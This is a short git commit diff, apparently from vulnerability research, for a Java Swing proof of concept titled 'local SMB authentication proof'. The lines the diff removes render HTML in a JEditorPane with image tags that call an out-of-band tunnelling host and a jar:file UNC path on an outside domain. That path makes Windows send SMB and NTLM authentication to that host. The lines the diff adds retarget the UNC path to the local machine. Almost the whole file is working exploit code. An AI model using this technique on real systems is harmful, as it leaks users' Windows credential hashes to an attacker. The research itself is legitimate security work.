00934661a9571b87333618e5731ca278c57659eb
sealldeveloper-aidr2 <umgdl71fvon28qmf--githubaidr2-1785896221@oob.blackmail.zip>
2026-08-17 04:43:56 +0000

    local SMB authentication proof

--- SwingWindowsProof.java
+++ SwingWindowsProof.java
@@ -1,14 +1,10 @@
 import javax.swing.*;
 public class SwingWindowsProof {
  public static void main(String[] args) throws Exception {
-   System.out.println("os="+System.getProperty("os.name")+" java="+System.getProperty("java.version")+" headless="+java.awt.GraphicsEnvironment.isHeadless());
-   String html="<html><body>"+
-     "<img src='https://ddlnp-54-196-15-50.run.pinggy-free.link/direct-image-jar-test'>"+
-     "<img src='jar:file://cwgmxyssmmssmczp--ijjarunc1786941692.oob.blackmail.zip/SHARE/nonexistent.jar!/x.png'>"+
-     "</body></html>";
-   SwingUtilities.invokeAndWait(() -> {
-     JEditorPane pane=new JEditorPane("text/html",html); JFrame frame=new JFrame("proof"); frame.add(pane); frame.setSize(500,500); frame.setVisible(true); System.out.println("Rendered frame: "+html);
-   });
-   Thread.sleep(30000); System.out.println("done"); System.exit(0);
+   String host=System.getenv("COMPUTERNAME");
+   System.out.println("os="+System.getProperty("os.name")+" host="+host+" java="+System.getProperty("java.version")+" headless="+java.awt.GraphicsEnvironment.isHeadless());
+   String html="<html><body><img src='jar:file://"+host+"/SHARE/nonexistent.jar!/x.png'></body></html>";
+   SwingUtilities.invokeAndWait(() -> { JEditorPane pane=new JEditorPane("text/html",html); JFrame frame=new JFrame("proof"); frame.add(pane); frame.setSize(500,500); frame.setVisible(true); System.out.println("Rendered frame: "+html); });
+   Thread.sleep(25000); System.out.println("done"); System.exit(0);
  }
 }
